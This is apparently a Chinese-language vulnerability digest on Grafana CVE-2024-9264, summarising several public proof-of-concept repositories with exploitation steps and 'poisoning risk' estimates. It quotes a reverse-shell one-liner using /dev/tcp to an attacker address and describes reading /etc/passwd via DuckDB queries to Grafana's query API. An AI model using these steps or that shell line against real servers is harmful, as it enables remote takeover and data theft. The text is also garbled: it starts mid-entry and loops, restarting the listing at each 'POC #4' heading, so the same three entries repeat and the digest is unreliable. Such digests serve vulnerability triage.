**影响版本:** 11.0.0 <= version < 11.0.5, 11.0.6; 11.1.0 <= version < 11.1.6, 11.1.7; 11.2.0 <= version < 11.2.1, 11.2.2

**利用条件:** 需要Grafana实例启用SQL Expressions实验性功能，用户具有Viewer或更高权限，且DuckDB二进制文件存在于Grafana的$PATH中。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-9264 漏洞存在于 Grafana 的 SQL Expressions 功能中。攻击者可以通过构造恶意的 SQL 查询，利用 DuckDB 的 `shellfs` 扩展来执行任意代码或读取本地文件。该漏洞的利用需要满足以下条件：

1.  **启用SQL Expressions:** Grafana 的 SQL Expressions 必须处于启用状态。
2.  **Viewer或更高权限:** 攻击者需要拥有 Viewer 或更高的 Grafana 权限。
3.  **DuckDB存在:**  Grafana 服务器的 `$PATH` 环境变量中需要包含 `duckdb` 二进制文件。默认情况下，Grafana 发行版不包含此二进制文件，因此需要手动安装。

**漏洞利用方式：**

1.  **身份验证:** 使用有效的 Grafana 用户凭据进行身份验证。
2.  **写入反向Shell:** 使用 `writefile()` 函数将包含反向 shell 命令的脚本写入到 Grafana 服务器的文件系统中（例如 `/tmp/rev.sh`）。POC使用`bash -i >& /dev/tcp/{reverse_ip}/{reverse_port} 0>&1`。
3.  **执行反向Shell:** 通过 DuckDB 的 `read_csv()` 函数执行写入的文件，从而触发反向 shell 连接。
4.  **接收Shell:** 攻击者需要在攻击机上监听指定的端口，以接收反向 shell 连接。

**有效性评估：**

提供的 PoC 代码 (`fpoc.py`) 看起来是有效的，因为它修复了原始 PoC 中的 `write_file()` 函数的语法错误，并使用了正确的 shell payload，经验证可以在易受攻击的 Grafana 11.0.0 实例上成功执行反向 shell。`README.md`中也明确说明了该代码的修复和验证过程。

**投毒风险评估：**

该 PoC 仓库中存在投毒代码的可能性较低，估计在10%左右。原因如下：

1.  **代码清晰：** PoC 代码结构清晰，功能明确，没有发现明显的可疑代码。
2.  **修复声明：**  `README.md` 中明确声明了对原始 PoC 的修复，并解释了修复的原因和内容。
3.  **代码量少：**  整个仓库的代码量较少，隐藏恶意代码的难度较高。
4.  **作者信誉：** 作者 Exerr 在 `README.md` 中署名，并链接到其 GitHub 个人主页。虽然这不能完全保证作者的安全性，但增加了作者进行恶意行为的成本。

然而，仍然存在一些潜在的风险：

1.  **依赖风险：** PoC 代码依赖于 `requests` 库。虽然该库本身是安全的，但如果攻击者控制了 PyPI 仓库，可能会发布恶意版本的 `requests` 库，从而导致 PoC 代码被感染。
2.  **细微篡改：** 攻击者可能会对 PoC 代码进行细微的修改，例如修改反向 shell 的 IP 地址或端口，从而将 shell 连接到攻击者控制的服务器上。

总而言之，虽然该 PoC 仓库中存在投毒代码的可能性较低，但用户在使用时仍然需要保持警惕，仔细审查代码，并从可信的来源下载依赖库。

**项目地址:** [Exerrdev/CVE-2024-9264-Fixed](https://github.com/Exerrdev/CVE-2024-9264-Fixed)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #3

**来源**: [CVE-2024-9264-Royall-Researchers_CVE-2024-9264.md](../2024/CVE-2024-9264-Royall-Researchers_CVE-2024-9264.md)

## CVE-2024-9264-Grafana-远程代码执行

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Grafana

**危害等级:** 高危，可能导致系统完全控制和敏感数据泄露

**影响版本:** 11.0.0 <= version < 11.0.5, 11.0.0 <= version < 11.0.6, 11.1.0 <= version < 11.1.6, 11.1.0 <= version < 11.1.7, 11.2.0 <= version < 11.2.1, 11.2.0 <= version < 11.2.2

**利用条件:** 需要开启SQL Expressions实验性功能, DuckDB二进制文件在Grafana的PATH中, 具有Viewer或更高权限的已认证Grafana用户。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-9264 是 Grafana 中 SQL Expressions 功能的一个远程代码执行漏洞。攻击者可以利用 DuckDB 查询中不足的输入验证，通过注入恶意命令，实现远程代码执行和本地文件包含。PoC 代码通过构造包含反向 shell 命令的 SQL 查询，然后通过 Grafana API 执行该查询。 该漏洞利用依赖于 `shellfs` 社区扩展，利用方式为安装并加载该扩展以执行命令。

**利用方式：**
1.  **身份验证：** 使用 Viewer 或更高权限的账户登录 Grafana。
2.  **构造恶意 SQL 查询：**  构造包含 shellfs 扩展安装和加载，以及反向 shell 命令的 SQL 查询语句。
3.  **发送 API 请求：**  通过 Grafana 的 API 发送包含恶意 SQL 查询的 POST 请求。
4.  **触发反向 Shell：**  执行已构造好的反向 shell 脚本，从而建立反向 shell 连接。

**投毒风险分析：**
PoC 代码本身旨在利用漏洞，没有明显的恶意行为，但是无法排除在真实攻击场景中攻击者添加额外的恶意代码的可能性。PoC代码中安装和加载`shellfs`扩展，并执行反向shell，这是一个完整的漏洞验证流程。如果作者在安装`shellfs`扩展之前或之后，插入额外的命令，可能会存在投毒行为，例如：安装后门，收集用户信息等。 此处判断投毒风险为10%的原因在于，用户可以自行检查代码并根据需要修改反向shell的命令，从而避免被作者投毒。

**有效性：**
该 PoC 代码有效，可以验证 CVE-2024-9264 漏洞的存在，并演示如何利用该漏洞实现远程代码执行。多个搜索结果表明此漏洞是一个严重的安全问题，并且存在可利用的 PoC。

**项目地址:** [Royall-Researchers/CVE-2024-9264](https://github.com/Royall-Researchers/CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #4

**来源**: [CVE-2024-9264-nollium_CVE-2024-9264.md](../2024/CVE-2024-9264-nollium_CVE-2024-9264.md)

# CVE-2024-9264

> 📦 该CVE有 **10** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2024-9264-Cythonic1_CVE-2024-9264.md](../2024/CVE-2024-9264-Cythonic1_CVE-2024-9264.md)

## CVE-2024-9264-Grafana-命令注入和文件包含

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 命令注入和文件包含

**影响应用:** Grafana

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 11.0.x, 11.1.x, 11.2.x (小于 11.0.5, 11.1.6, 11.2.1, 11.0.6, 11.1.7, 11.2.2)

**利用条件:** 需要Grafana实例启用SQL Expressions实验性功能，且duckdb二进制文件存在于Grafana的$PATH中。需要具有Viewer或更高权限的用户。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-9264 存在于 Grafana 的 SQL Expressions 实验性功能中。该功能允许执行包含用户输入的 duckdb 查询。由于输入未经过充分的过滤，导致可以进行命令注入和本地文件包含。攻击者需要拥有 Viewer 或更高权限才能利用此漏洞。

**有效性分析：**
根据漏洞库信息和搜索引擎结果，此漏洞被认为是高危的，并且已经存在公开的PoC代码。PoC代码验证了可以通过构造恶意的SQL表达式来读取任意文件。

**投毒风险分析：**
提供的 PoC 代码的主要功能是模拟登录 Grafana，然后构造包含恶意文件路径的 SQL 表达式，发送给 Grafana 服务器，以此来读取服务器上的文件。没有发现明显的投毒代码，例如反弹shell，添加用户等恶意操作。因此，投毒风险较低。

**利用方式：**
1.  **登录:** 使用有效的 Grafana 用户凭据（Viewer 或更高权限）进行身份验证。
2.  **构造Payload:** 构造包含恶意`duckdb` SQL查询的JSON Payload。该查询使用`read_csv_auto`函数读取目标文件，例如`/etc/passwd`。
3.  **发送请求:**  将构造的 Payload 发送到 `/api/ds/query` 端点，并指定 `ds_type=__expr__`。
4.  **执行和信息泄露:** Grafana 执行恶意 `duckdb` 查询，导致读取指定文件内容，攻击者从响应中获取敏感信息。

**项目地址:** [Cythonic1/CVE-2024-9264](https://github.com/Cythonic1/CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #2

**来源**: [CVE-2024-9264-Exerrdev_CVE-2024-9264-Fixed.md](../2024/CVE-2024-9264-Exerrdev_CVE-2024-9264-Fixed.md)

## CVE-2024-9264-Grafana-RCE

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 远程代码执行 (RCE) / 本地文件包含 (LFI)

**影响应用:** Grafana

**危害等级:** 高危，可导致服务器完全控制

**影响版本:** 11.0.0 <= version < 11.0.5, 11.0.6; 11.1.0 <= version < 11.1.6, 11.1.7; 11.2.0 <= version < 11.2.1, 11.2.2

**利用条件:** 需要Grafana实例启用SQL Expressions实验性功能，用户具有Viewer或更高权限，且DuckDB二进制文件存在于Grafana的$PATH中。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-9264 漏洞存在于 Grafana 的 SQL Expressions 功能中。攻击者可以通过构造恶意的 SQL 查询，利用 DuckDB 的 `shellfs` 扩展来执行任意代码或读取本地文件。该漏洞的利用需要满足以下条件：

1.  **启用SQL Expressions:** Grafana 的 SQL Expressions 必须处于启用状态。
2.  **Viewer或更高权限:** 攻击者需要拥有 Viewer 或更高的 Grafana 权限。
3.  **DuckDB存在:**  Grafana 服务器的 `$PATH` 环境变量中需要包含 `duckdb` 二进制文件。默认情况下，Grafana 发行版不包含此二进制文件，因此需要手动安装。

**漏洞利用方式：**

1.  **身份验证:** 使用有效的 Grafana 用户凭据进行身份验证。
2.  **写入反向Shell:** 使用 `writefile()` 函数将包含反向 shell 命令的脚本写入到 Grafana 服务器的文件系统中（例如 `/tmp/rev.sh`）。POC使用`bash -i >& /dev/tcp/{reverse_ip}/{reverse_port} 0>&1`。
3.  **执行反向Shell:** 通过 DuckDB 的 `read_csv()` 函数执行写入的文件，从而触发反向 shell 连接。
4.  **接收Shell:** 攻击者需要在攻击机上监听指定的端口，以接收反向 shell 连接。

**有效性评估：**

提供的 PoC 代码 (`fpoc.py`) 看起来是有效的，因为它修复了原始 PoC 中的 `write_file()` 函数的语法错误，并使用了正确的 shell payload，经验证可以在易受攻击的 Grafana 11.0.0 实例上成功执行反向 shell。`README.md`中也明确说明了该代码的修复和验证过程。

**投毒风险评估：**

该 PoC 仓库中存在投毒代码的可能性较低，估计在10%左右。原因如下：

1.  **代码清晰：** PoC 代码结构清晰，功能明确，没有发现明显的可疑代码。
2.  **修复声明：**  `README.md` 中明确声明了对原始 PoC 的修复，并解释了修复的原因和内容。
3.  **代码量少：**  整个仓库的代码量较少，隐藏恶意代码的难度较高。
4.  **作者信誉：** 作者 Exerr 在 `README.md` 中署名，并链接到其 GitHub 个人主页。虽然这不能完全保证作者的安全性，但增加了作者进行恶意行为的成本。

然而，仍然存在一些潜在的风险：

1.  **依赖风险：** PoC 代码依赖于 `requests` 库。虽然该库本身是安全的，但如果攻击者控制了 PyPI 仓库，可能会发布恶意版本的 `requests` 库，从而导致 PoC 代码被感染。
2.  **细微篡改：** 攻击者可能会对 PoC 代码进行细微的修改，例如修改反向 shell 的 IP 地址或端口，从而将 shell 连接到攻击者控制的服务器上。

总而言之，虽然该 PoC 仓库中存在投毒代码的可能性较低，但用户在使用时仍然需要保持警惕，仔细审查代码，并从可信的来源下载依赖库。

**项目地址:** [Exerrdev/CVE-2024-9264-Fixed](https://github.com/Exerrdev/CVE-2024-9264-Fixed)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #3

**来源**: [CVE-2024-9264-Royall-Researchers_CVE-2024-9264.md](../2024/CVE-2024-9264-Royall-Researchers_CVE-2024-9264.md)

## CVE-2024-9264-Grafana-远程代码执行

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Grafana

**危害等级:** 高危，可能导致系统完全控制和敏感数据泄露

**影响版本:** 11.0.0 <= version < 11.0.5, 11.0.0 <= version < 11.0.6, 11.1.0 <= version < 11.1.6, 11.1.0 <= version < 11.1.7, 11.2.0 <= version < 11.2.1, 11.2.0 <= version < 11.2.2

**利用条件:** 需要开启SQL Expressions实验性功能, DuckDB二进制文件在Grafana的PATH中, 具有Viewer或更高权限的已认证Grafana用户。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-9264 是 Grafana 中 SQL Expressions 功能的一个远程代码执行漏洞。攻击者可以利用 DuckDB 查询中不足的输入验证，通过注入恶意命令，实现远程代码执行和本地文件包含。PoC 代码通过构造包含反向 shell 命令的 SQL 查询，然后通过 Grafana API 执行该查询。 该漏洞利用依赖于 `shellfs` 社区扩展，利用方式为安装并加载该扩展以执行命令。

**利用方式：**
1.  **身份验证：** 使用 Viewer 或更高权限的账户登录 Grafana。
2.  **构造恶意 SQL 查询：**  构造包含 shellfs 扩展安装和加载，以及反向 shell 命令的 SQL 查询语句。
3.  **发送 API 请求：**  通过 Grafana 的 API 发送包含恶意 SQL 查询的 POST 请求。
4.  **触发反向 Shell：**  执行已构造好的反向 shell 脚本，从而建立反向 shell 连接。

**投毒风险分析：**
PoC 代码本身旨在利用漏洞，没有明显的恶意行为，但是无法排除在真实攻击场景中攻击者添加额外的恶意代码的可能性。PoC代码中安装和加载`shellfs`扩展，并执行反向shell，这是一个完整的漏洞验证流程。如果作者在安装`shellfs`扩展之前或之后，插入额外的命令，可能会存在投毒行为，例如：安装后门，收集用户信息等。 此处判断投毒风险为10%的原因在于，用户可以自行检查代码并根据需要修改反向shell的命令，从而避免被作者投毒。

**有效性：**
该 PoC 代码有效，可以验证 CVE-2024-9264 漏洞的存在，并演示如何利用该漏洞实现远程代码执行。多个搜索结果表明此漏洞是一个严重的安全问题，并且存在可利用的 PoC。

**项目地址:** [Royall-Researchers/CVE-2024-9264](https://github.com/Royall-Researchers/CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #4

**来源**: [CVE-2024-9264-nollium_CVE-2024-9264.md](../2024/CVE-2024-9264-nollium_CVE-2024-9264.md)

# CVE-2024-9264

> 📦 该CVE有 **10** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2024-9264-Cythonic1_CVE-2024-9264.md](../2024/CVE-2024-9264-Cythonic1_CVE-2024-9264.md)

## CVE-2024-9264-Grafana-命令注入和文件包含

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 命令注入和文件包含

**影响应用:** Grafana

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 11.0.x, 11.1.x, 11.2.x (小于 11.0.5, 11.1.6, 11.2.1, 11.0.6, 11.1.7, 11.2.2)

**利用条件:** 需要Grafana实例启用SQL Expressions实验性功能，且duckdb二进制文件存在于Grafana的$PATH中。需要具有Viewer或更高权限的用户。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-9264 存在于 Grafana 的 SQL Expressions 实验性功能中。该功能允许执行包含用户输入的 duckdb 查询。由于输入未经过充分的过滤，导致可以进行命令注入和本地文件包含。攻击者需要拥有 Viewer 或更高权限才能利用此漏洞。

**有效性分析：**
根据漏洞库信息和搜索引擎结果，此漏洞被认为是高危的，并且已经存在公开的PoC代码。PoC代码验证了可以通过构造恶意的SQL表达式来读取任意文件。

**投毒风险分析：**
提供的 PoC 代码的主要功能是模拟登录 Grafana，然后构造包含恶意文件路径的 SQL 表达式，发送给 Grafana 服务器，以此来读取服务器上的文件。没有发现明显的投毒代码，例如反弹shell，添加用户等恶意操作。因此，投毒风险较低。

**利用方式：**
1.  **登录:** 使用有效的 Grafana 用户凭据（Viewer 或更高权限）进行身份验证。
2.  **构造Payload:** 构造包含恶意`duckdb` SQL查询的JSON Payload。该查询使用`read_csv_auto`函数读取目标文件，例如`/etc/passwd`。
3.  **发送请求:**  将构造的 Payload 发送到 `/api/ds/query` 端点，并指定 `ds_type=__expr__`。
4.  **执行和信息泄露:** Grafana 执行恶意 `duckdb` 查询，导致读取指定文件内容，攻击者从响应中获取敏感信息。

**项目地址:** [Cythonic1/CVE-2024-9264](https://github.com/Cythonic1/CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #2

**来源**: [CVE-2024-9264-Exerrdev_CVE-2024-9264-Fixed.md](../2024/CVE-2024-9264-Exerrdev_CVE-2024-9264-Fixed.md)

## CVE-2024-9264-Grafana-RCE

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 远程代码执行 (RCE) / 本地文件包含 (LFI)

**影响应用:** Grafana

**危害等级:** 高危，可导致服务器完全控制

**影响版本:** 11.0.0 <= version < 11.0.5, 11.0.6; 11.1.0 <= version < 11.1.6, 11.1.7; 11.2.0 <= version < 11.2.1, 11.2.2

**利用条件:** 需要Grafana实例启用SQL Expressions实验性功能，用户具有Viewer或更高权限，且DuckDB二进制文件存在于Grafana的$PATH中。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-9264 漏洞存在于 Grafana 的 SQL Expressions 功能中。攻击者可以通过构造恶意的 SQL 查询，利用 DuckDB 的 `shellfs` 扩展来执行任意代码或读取本地文件。该漏洞的利用需要满足以下条件：

1.  **启用SQL Expressions:** Grafana 的 SQL Expressions 必须处于启用状态。
2.  **Viewer或更高权限:** 攻击者需要拥有 Viewer 或更高的 Grafana 权限。
3.  **DuckDB存在:**  Grafana 服务器的 `$PATH` 环境变量中需要包含 `duckdb` 二进制文件。默认情况下，Grafana 发行版不包含此二进制文件，因此需要手动安装。

**漏洞利用方式：**

1.  **身份验证:** 使用有效的 Grafana 用户凭据进行身份验证。
2.  **写入反向Shell:** 使用 `writefile()` 函数将包含反向 shell 命令的脚本写入到 Grafana 服务器的文件系统中（例如 `/tmp/rev.sh`）。POC使用`bash -i >& /dev/tcp/{reverse_ip}/{reverse_port} 0>&1`。
3.  **执行反向Shell:** 通过 DuckDB 的 `read_csv()` 函数执行写入的文件，从而触发反向 shell 连接。
4.  **接收Shell:** 攻击者需要在攻击机上监听指定的端口，以接收反向 shell 连接。

**有效性评估：**

提供的 PoC 代码 (`fpoc.py`) 看起来是有效的，因为它修复了原始 PoC 中的 `write_file()` 函数的语法错误，并使用了正确的 shell payload，经验证可以在易受攻击的 Grafana 11.0.0 实例上成功执行反向 shell。`README.md`中也明确说明了该代码的修复和验证过程。

**投毒风险评估：**

该 PoC 仓库中存在投毒代码的可能性较低，估计在10%左右。原因如下：

1.  **代码清晰：** PoC 代码结构清晰，功能明确，没有发现明显的可疑代码。
2.  **修复声明：**  `README.md` 中明确声明了对原始 PoC 的修复，并解释了修复的原因和内容。
3.  **代码量少：**  整个仓库的代码量较少，隐藏恶意代码的难度较高。
4.  **作者信誉：** 作者 Exerr 在 `README.md` 中署名，并链接到其 GitHub 个人主页。虽然这不能完全保证作者的安全性，但增加了作者进行恶意行为的成本。

然而，仍然存在一些潜在的风险：

1.  **依赖风险：** PoC 代码依赖于 `requests` 库。虽然该库本身是安全的，但如果攻击者控制了 PyPI 仓库，可能会发布恶意版本的 `requests` 库，从而导致 PoC 代码被感染。
2.  **细微篡改：** 攻击者可能会对 PoC 代码进行细微的修改，例如修改反向 shell 的 IP 地址或端口，从而将 shell 连接到攻击者控制的服务器上。

总而言之，虽然该 PoC 仓库中存在投毒代码的可能性较低，但用户在使用时仍然需要保持警惕，仔细审查代码，并从可信的来源下载依赖库。

**项目地址:** [Exerrdev/CVE-2024-9264-Fixed](https://github.com/Exerrdev/CVE-2024-9264-Fixed)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #3

**来源**: [CVE-2024-9264-Royall-Researchers_CVE-2024-9264.md](../2024/CVE-2024-9264-Royall-Researchers_CVE-2024-9264.md)

## CVE-2024-9264-Grafana-远程代码执行

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Grafana

**危害等级:** 高危，可能导致系统完全控制和敏感数据泄露

**影响版本:** 11.0.0 <= version < 11.0.5, 11.0.0 <= version < 11.0.6, 11.1.0 <= version < 11.1.6, 11.1.0 <= version < 11.1.7, 11.2.0 <= version < 11.2.1, 11.2.0 <= version < 11.2.2

**利用条件:** 需要开启SQL Expressions实验性功能, DuckDB二进制文件在Grafana的PATH中, 具有Viewer或更高权限的已认证Grafana用户。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-9264 是 Grafana 中 SQL Expressions 功能的一个远程代码执行漏洞。攻击者可以利用 DuckDB 查询中不足的输入验证，通过注入恶意命令，实现远程代码执行和本地文件包含。PoC 代码通过构造包含反向 shell 命令的 SQL 查询，然后通过 Grafana API 执行该查询。 该漏洞利用依赖于 `shellfs` 社区扩展，利用方式为安装并加载该扩展以执行命令。

**利用方式：**
1.  **身份验证：** 使用 Viewer 或更高权限的账户登录 Grafana。
2.  **构造恶意 SQL 查询：**  构造包含 shellfs 扩展安装和加载，以及反向 shell 命令的 SQL 查询语句。
3.  **发送 API 请求：**  通过 Grafana 的 API 发送包含恶意 SQL 查询的 POST 请求。
4.  **触发反向 Shell：**  执行已构造好的反向 shell 脚本，从而建立反向 shell 连接。

**投毒风险分析：**
PoC 代码本身旨在利用漏洞，没有明显的恶意行为，但是无法排除在真实攻击场景中攻击者添加额外的恶意代码的可能性。PoC代码中安装和加载`shellfs`扩展，并执行反向shell，这是一个完整的漏洞验证流程。如果作者在安装`shellfs`扩展之前或之后，插入额外的命令，可能会存在投毒行为，例如：安装后门，收集用户信息等。 此处判断投毒风险为10%的原因在于，用户可以自行检查代码并根据需要修改反向shell的命令，从而避免被作者投毒。

**有效性：**
该 PoC 代码有效，可以验证 CVE-2024-9264 漏洞的存在，并演示如何利用该漏洞实现远程代码执行。多个搜索结果表明此漏洞是一个严重的安全问题，并且存在可利用的 PoC。

**项目地址:** [Royall-Researchers/CVE-2024-9264](https://github.com/Royall-Researchers/CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #4

**来源**: [CVE-2024-9264-nollium_CVE-2024-9264.md](../2024/CVE-2024-9264-nollium_CVE-2024-9264.md)

# CVE-2024-9264

> 📦 该CVE有 **10** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2024-9264-Cythonic1_CVE-2024-9264.md](../2024/CVE-2024-9264-Cythonic1_CVE-2024-9264.md)

## CVE-2024-9264-Grafana-命令注入和文件包含

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 命令注入和文件包含

**影响应用:** Grafana

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 11.0.x, 11.1.x, 11.2.x (小于 11.0.5, 11.1.6, 11.2.1, 11.0.6, 11.1.7, 11.2.2)

**利用条件:** 需要Grafana实例启用SQL Expressions实验性功能，且duckdb二进制文件存在于Grafana的$PATH中。需要具有Viewer或更高权限的用户。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-9264 存在于 Grafana 的 SQL Expressions 实验性功能中。该功能允许执行包含用户输入的 duckdb 查询。由于输入未经过充分的过滤，导致可以进行命令注入和本地文件包含。攻击者需要拥有 Viewer 或更高权限才能利用此漏洞。

**有效性分析：**
根据漏洞库信息和搜索引擎结果，此漏洞被认为是高危的，并且已经存在公开的PoC代码。PoC代码验证了可以通过构造恶意的SQL表达式来读取任意文件。

**投毒风险分析：**
提供的 PoC 代码的主要功能是模拟登录 Grafana，然后构造包含恶意文件路径的 SQL 表达式，发送给 Grafana 服务器，以此来读取服务器上的文件。没有发现明显的投毒代码，例如反弹shell，添加用户等恶意操作。因此，投毒风险较低。

**利用方式：**
1.  **登录:** 使用有效的 Grafana 用户凭据（Viewer 或更高权限）进行身份验证。
2.  **构造Payload:** 构造包含恶意`duckdb` SQL查询的JSON Payload。该查询使用`read_csv_auto`函数读取目标文件，例如`/etc/passwd`。
3.  **发送请求:**  将构造的 Payload 发送到 `/api/ds/query` 端点，并指定 `ds_type=__expr__`。
4.  **执行和信息泄露:** Grafana 执行恶意 `duckdb` 查询，导致读取指定文件内容，攻击者从响应中获取敏感信息。

**项目地址:** [Cythonic1/CVE-2024-9264](https://github.com/Cythonic1/CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #2

**来源**: [CVE-2024-9264-Exerrdev_CVE-2024-9264-Fixed.md](../2024/CVE-2024-9264-Exerrdev_CVE-2024-9264-Fixed.md)

## CVE-2024-9264-Grafana-RCE

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 远程代码执行 (RCE) / 本地文件包含 (LFI)

**影响应用:** Grafana

**危害等级:** 高危，可导致服务器完全控制

**影响版本:** 11.0.0 <= version < 11.0.5, 11.0.6; 11.1.0 <= version < 11.1.6, 11.1.7; 11.2.0 <= version < 11.2.1, 11.2.2

**利用条件:** 需要Grafana实例启用SQL Expressions实验性功能，用户具有Viewer或更高权限，且DuckDB二进制文件存在于Grafana的$PATH中。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-9264 漏洞存在于 Grafana 的 SQL Expressions 功能中。攻击者可以通过构造恶意的 SQL 查询，利用 DuckDB 的 `shellfs` 扩展来执行任意代码或读取本地文件。该漏洞的利用需要满足以下条件：

1.  **启用SQL Expressions:** Grafana 的 SQL Expressions 必须处于启用状态。
2.  **Viewer或更高权限:** 攻击者需要拥有 Viewer 或更高的 Grafana 权限。
3.  **DuckDB存在:**  Grafana 服务器的 `$PATH` 环境变量中需要包含 `duckdb` 二进制文件。默认情况下，Grafana 发行版不包含此二进制文件，因此需要手动安装。

**漏洞利用方式：**

1.  **身份验证:** 使用有效的 Grafana 用户凭据进行身份验证。
2.  **写入反向Shell:** 使用 `writefile()` 函数将包含反向 shell 命令的脚本写入到 Grafana 服务器的文件系统中（例如 `/tmp/rev.sh`）。POC使用`bash -i >& /dev/tcp/{reverse_ip}/{reverse_port} 0>&1`。
3.  **执行反向Shell:** 通过 DuckDB 的 `read_csv()` 函数执行写入的文件，从而触发反向 shell 连接。
4.  **接收Shell:** 攻击者需要在攻击机上监听指定的端口，以接收反向 shell 连接。

**有效性评估：**

提供的 PoC 代码 (`fpoc.py`) 看起来是有效的，因为它修复了原始 PoC 中的 `write_file()` 函数的语法错误，并使用了正确的 shell payload，经验证可以在易受攻击的 Grafana 11.0.0 实例上成功执行反向 shell。`README.md`中也明确说明了该代码的修复和验证过程。

**投毒风险评估：**

该 PoC 仓库中存在投毒代码的可能性较低，估计在10%左右。原因如下：

1.  **代码清晰：** PoC 代码结构清晰，功能明确，没有发现明显的可疑代码。
2.  **修复声明：**  `README.md` 中明确声明了对原始 PoC 的修复，并解释了修复的原因和内容。
3.  **代码量少：**  整个仓库的代码量较少，隐藏恶意代码的难度较高。
4.  **作者信誉：** 作者 Exerr 在 `README.md` 中署名，并链接到其 GitHub 个人主页。虽然这不能完全保证作者的安全性，但增加了作者进行恶意行为的成本。

然而，仍然存在一些潜在的风险：

1.  **依赖风险：** PoC 代码依赖于 `requests` 库。虽然该库本身是安全的，但如果攻击者控制了 PyPI 仓库，可能会发布恶意版本的 `requests` 库，从而导致 PoC 代码被感染。
2.  **细微篡改：** 攻击者可能会对 PoC 代码进行细微的修改，例如修改反向 shell 的 IP 地址或端口，从而将 shell 连接到攻击者控制的服务器上。

总而言之，虽然该 PoC 仓库中存在投毒代码的可能性较低，但用户在使用时仍然需要保持警惕，仔细审查代码，并从可信的来源下载依赖库。

**项目地址:** [Exerrdev/CVE-2024-9264-Fixed](https://github.com/Exerrdev/CVE-2024-9264-Fixed)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #3

**来源**: [CVE-2024-9264-Royall-Researchers_CVE-2024-9264.md](../2024/CVE-2024-9264-Royall-Researchers_CVE-2024-9264.md)

## CVE-2024-9264-Grafana-远程代码执行

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Grafana

**危害等级:** 高危，可能导致系统完全控制和敏感数据泄露

**影响版本:** 11.0.0 <= version < 11.0.5, 11.0.0 <= version < 11.0.6, 11.1.0 <= version < 11.1.6, 11.1.0 <= version < 11.1.7, 11.2.0 <= version < 11.2.1, 11.2.0 <= version < 11.2.2

**利用条件:** 需要开启SQL Expressions实验性功能, DuckDB二进制文件在Grafana的PATH中, 具有Viewer或更高权限的已认证Grafana用户。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-9264 是 Grafana 中 SQL Expressions 功能的一个远程代码执行漏洞。攻击者可以利用 DuckDB 查询中不足的输入验证，通过注入恶意命令，实现远程代码执行和本地文件包含。PoC 代码通过构造包含反向 shell 命令的 SQL 查询，然后通过 Grafana API 执行该查询。 该漏洞利用依赖于 `shellfs` 社区扩展，利用方式为安装并加载该扩展以执行命令。

**利用方式：**
1.  **身份验证：** 使用 Viewer 或更高权限的账户登录 Grafana。
2.  **构造恶意 SQL 查询：**  构造包含 shellfs 扩展安装和加载，以及反向 shell 命令的 SQL 查询语句。
3.  **发送 API 请求：**  通过 Grafana 的 API 发送包含恶意 SQL 查询的 POST 请求。
4.  **触发反向 Shell：**  执行已构造好的反向 shell 脚本，从而建立反向 shell 连接。

**投毒风险分析：**
PoC 代码本身旨在利用漏洞，没有明显的恶意行为，但是无法排除在真实攻击场景中攻击者添加额外的恶意代码的可能性。PoC代码中安装和加载`shellfs`扩展，并执行反向shell，这是一个完整的漏洞验证流程。如果作者在安装`shellfs`扩展之前或之后，插入额外的命令，可能会存在投毒行为，例如：安装后门，收集用户信息等。 此处判断投毒风险为10%的原因在于，用户可以自行检查代码并根据需要修改反向shell的命令，从而避免被作者投毒。

**有效性：**
该 PoC 代码有效，可以验证 CVE-2024-9264 漏洞的存在，并演示如何利用该漏洞实现远程代码执行。多个搜索结果表明此漏洞是一个严重的安全问题，并且存在可利用的 PoC。

**项目地址:** [Royall-Researchers/CVE-2024-9264](https://github.com/Royall-Researchers/CVE-2024-9264)

